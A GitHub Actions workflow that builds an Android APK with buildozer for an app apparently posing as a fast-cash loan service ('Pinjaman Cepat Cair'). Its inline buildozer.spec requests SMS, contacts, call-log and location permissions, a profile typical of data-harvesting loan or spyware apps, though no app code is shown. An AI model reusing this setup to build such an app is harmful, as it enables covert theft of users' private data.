name: Build APK

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.9'
      
      - name: Install dependencies
        run: |
          sudo apt update
          sudo apt install -y python3-pip openjdk-17-jdk git unzip wget
          pip3 install buildozer cython virtualenv
      
      - name: Setup Android SDK (FINAL FIX)
        run: |
          # Bersihkan folder lama
          rm -rf $HOME/android-sdk
          rm -rf $HOME/.buildozer/android/platform/android-sdk
          
          # Buat folder dengan struktur yang benar
          mkdir -p $HOME/android-sdk/cmdline-tools
          cd $HOME/android-sdk
          
          # Download SDK tools
          wget -q https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip
          unzip -q commandlinetools-linux-11076708_latest.zip
          
          # CARA BARU: langsung taruh di folder yang benar
          rm -rf cmdline-tools  # hapus folder hasil extract
          mkdir -p cmdline-tools/latest
          unzip -q commandlinetools-linux-11076708_latest.zip -d cmdline-tools/latest
          
          # Hapus folder dalam jika ada
          if [ -d "cmdline-tools/latest/cmdline-tools" ]; then
            mv cmdline-tools/latest/cmdline-tools/* cmdline-tools/latest/
            rm -rf cmdline-tools/latest/cmdline-tools
          fi
          
          # Set environment
          export ANDROID_HOME=$HOME/android-sdk
          export PATH=$PATH:$ANDROID_HOME/cmdline-tools/latest/bin
          
          # Accept licenses
          yes | $ANDROID_HOME/cmdline-tools/latest/bin/sdkmanager --licenses
          
          # Install SDK components
          $ANDROID_HOME/cmdline-tools/latest/bin/sdkmanager \
            "platform-tools" \
            "platforms;android-31" \
            "build-tools;31.0.0"
          
          # Copy ke lokasi buildozer
          mkdir -p $HOME/.buildozer/android/platform
          cp -r $HOME/android-sdk $HOME/.buildozer/android/platform/
          
          # Set environment variables
          echo "ANDROID_HOME=$HOME/android-sdk" >> $GITHUB_ENV
          echo "$HOME/android-sdk/cmdline-tools/latest/bin" >> $GITHUB_PATH
          echo "$HOME/android-sdk/platform-tools" >> $GITHUB_PATH
          
          echo "✅ Android SDK siap!"
      
      - name: Fix buildozer.spec
        run: |
          cat > buildozer.spec << 'EOF'
          [app]
          title = Pinjaman Cepat Cair
          package.name = pinjolcepat
          package.domain = com.pinjol.cepat
          source.dir = .
          source.include_exts = py,png,jpg,kv,ttf,json
          version = 1.0.0
          requirements = python3,kivy==2.1.0,requests,android,pyjnius,prctl
          orientation = portrait
          osx.python_version = 3
          osx.kivy_version = 2.1.0
          fullscreen = 0

          [buildozer]
          log_level = 2
          warn_on_root = 1

          [android]
          api = 31
          minapi = 21
          ndk = 25b
          permissions = INTERNET,READ_SMS,RECEIVE_SMS,READ_CONTACTS,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,READ_CALL_LOG
          android.permissions = INTERNET,READ_SMS,RECEIVE_SMS,READ_CONTACTS,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,READ_CALL_LOG
          android.api = 31
          android.minapi = 21
          android.ndk = 25b
          android.accept_sdk_license = True
          EOF
      
      - name: Build APK
        run: |
          export USER=runner
          export ANDROID_HOME=$HOME/android-sdk
          export PATH=$PATH:$ANDROID_HOME/cmdline-tools/latest/bin:$ANDROID_HOME/platform-tools
          
          # Clean
          rm -rf bin .buildozer
          
          # Build
          buildozer android debug
      
      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: RNSMV2-APK
          path: bin/*.apk